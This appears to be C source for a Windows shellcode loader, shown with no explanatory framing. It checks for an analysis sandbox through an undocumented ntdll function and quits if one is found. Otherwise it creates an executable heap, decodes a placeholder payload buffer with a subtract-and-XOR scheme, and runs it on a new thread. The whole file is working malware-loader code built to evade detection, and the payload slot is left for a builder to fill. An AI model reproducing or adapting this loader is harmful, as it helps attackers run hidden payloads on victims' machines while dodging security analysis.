#include "shellcall.h"
void run(void* buffer) {
	void (*function)();
	function = (void (*)())buffer;
	function();
}
void start()
{
	if (IsSandbox() == TRUE)
		return;
	LPVOID heap;
	heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	char shellcode[DATA_SIZE] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	
	
	DWORD size = ((PDWORD)shellcode)[0];//size

	PCHAR ptr = HeapAlloc(heap, HEAP_ZERO_MEMORY, size);
	
	
	PCHAR tmpptr = (DWORD)shellcode + sizeof(DWORD);

	for (int i = 0; i < size; i++)
	{
		ptr[i] = (tmpptr[i] - 1) ^ i;
	}

	//EnumWindows((WNDENUMPROC)run, ptr);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
	while (1)
	{
		Sleep(8000);
	}
	return 0;
}
void* __cdecl Mymemcpy(void* dest,
	const void* src,
	size_t 	count
)
{
	char* char_dest = (char*)dest;
	char* char_src = (char*)src;

	if ((char_dest <= char_src) || (char_dest >= (char_src + count)))
	{
		/*  non-overlapping buffers */
		while (count > 0)
		{
			*char_dest = *char_src;
			char_dest++;
			char_src++;
			count--;
		}
	}
	else
	{
		/* overlaping buffers */
		char_dest = (char*)dest + count - 1;
		char_src = (char*)src + count - 1;

		while (count > 0)
		{
			*char_dest = *char_src;
			char_dest--;
			char_src--;
			count--;
		}
	}

	return dest;
}

BOOL IsSandbox()
{
	typedef void (*PfxInitialize)(LPVOID result);
	PfxInitialize PFX = (PfxInitialize)GetProcAddress(GetModuleHandleW(L"NTDLL"), "PfxInitialize");

	typedef struct _Pfx
	{
		DWORD Data1;
		DWORD Data2;
		DWORD Data3;

	}Pfx;
	Pfx pfx = { 0 };
	PFX(&pfx);
	if (pfx.Data1 == 0x200)
	{
		return FALSE;
	}
	else
	{
		return TRUE;
	}
}